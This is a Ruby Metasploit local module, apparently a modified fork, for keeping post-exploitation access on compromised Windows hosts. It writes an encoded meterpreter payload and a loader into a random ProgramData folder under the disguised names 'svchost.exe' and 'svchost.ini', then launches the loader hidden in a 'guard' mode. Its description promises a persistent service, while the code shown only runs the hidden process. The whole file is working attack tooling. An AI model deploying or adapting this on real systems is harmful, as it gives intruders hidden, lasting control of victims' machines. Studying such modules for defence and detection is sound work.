##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'metasploit/framework/compiler/windows'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv


  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Windows Persistent Service Installer Simple API',
                      'Description'    => %q{
        This Module will generate and upload an executable to a remote host, next will make it a persistent service.
        It will create a new service which will start the payload whenever the service is running. Admin or system
        privilege is required.
      },
                      'License'        => MSF_LICENSE,
                      'Author'         => ['Green-m <greenm.xxoo[at]gmail.com>'],
                      'Platform'       => ['windows'],
                      'Arch'           => [ARCH_X86, ARCH_X64],
                      'Targets'        => [['Windows', {}]],
                      'SessionTypes'   => ['meterpreter'],
                      'DefaultTarget'  => 0,
                      'References'     => [
                              ['URL', 'https://github.com/rapid7/metasploit-framework/blob/master/external/source/metsvc/src/metsvc.cpp']
                      ],
                      'DisclosureDate' => "Jul 10 2019"
          ))

    register_options(
            [
                    OptBool.new('GUARD', [false, 'Not install  service but run as guard', false]),

            ])
  end

  # Run Method for when run command is issued
  #-------------------------------------------------------------------------------
  def exploit

    if datastore['PAYLOAD'].include?(ARCH_X64)
      service_exe_file = "loader_x64.exe"
    else
      service_exe_file = "loader_x86.exe"
    end

    rexepath = create_store_rand_dir()
    if rexepath == nil
      pub_json_result(false,
                      'Create rand dir failed',
                      nil,
                      self.uuid)
      return
    end

    # Set variables

    @guard_mode     = datastore['GUARD']
    rexename        = "svchost.exe"
    @shellcode_file = "svchost.ini"


    buf = create_payload
    vprint_status(buf)
    shellcode_path = write_exe_to_target(buf, @shellcode_file, rexepath)

    bin         = File.read(File.join(Msf::Config.data_directory, 'exploits', 'persistence_dll', service_exe_file))
    victim_path = write_exe_to_target(bin, rexename, rexepath)
    begin
      vprint_status("Running as guard ")
      session.sys.process.execute("#{victim_path} guard", nil, {'Hidden' => true})
      data = {:path => victim_path}
      pub_json_result(true,
                      nil,
                      data,
                      self.uuid)
    rescue ::Exception => e
      vprint_error("Failed to Running as guard.")
      vprint_error(e.to_s)
      print_error_redis(e.to_s)
      pub_json_result(false,
                      "Failed to run as guard.",
                      nil,
                      self.uuid)
    end
  end

  def create_payload
    p = payload.encoded
    Msf::Simple::Buffer.transform(p, 'hex', 'buf')
  end

  # Function for writing executable to target host
  # Code from post/windows/manage/persistence_exe
  #
  def write_exe_to_target(rexe, rexename, rexepath)
    # check if we have write permission
    if rexepath
      begin
        temprexe = rexepath + "\\" + rexename
        write_file_to_target(temprexe, rexe)
      rescue Rex::Post::Meterpreter::RequestError
        vprint_warning("Insufficient privileges to write in #{rexepath}, writing to %APPDATA%")
        temprexe = session.sys.config.getenv('ProgramFiles') + "\\Internet Explorer\\" + rexename
        write_file_to_target(temprexe, rexe)
      end
    else
      temprexe = session.sys.config.getenv('ProgramFiles') + "\\Internet Explorer\\" + rexename
      write_file_to_target(temprexe, rexe)
    end

    vprint_good("Meterpreter service exe written to #{temprexe}")

    temprexe
  end

  def write_file_to_target(temprexe, rexe)
    fd = session.fs.file.new(temprexe, "wb")
    fd.write(rexe)
    fd.close
  end

  def create_store_rand_dir()
    dirname     = Rex::Text.rand_text_alpha(10)
    fulldirname = session.sys.config.getenv('ProgramData') + "\\" + dirname
    session.fs.dir.mkdir(fulldirname)
    if session.fs.file.exist? fulldirname
      vprint_good("create storedir : #{fulldirname}")
      return fulldirname
    else
      vprint_error("create storedir failed : #{fulldirname}")
      return nil
    end
  end
end
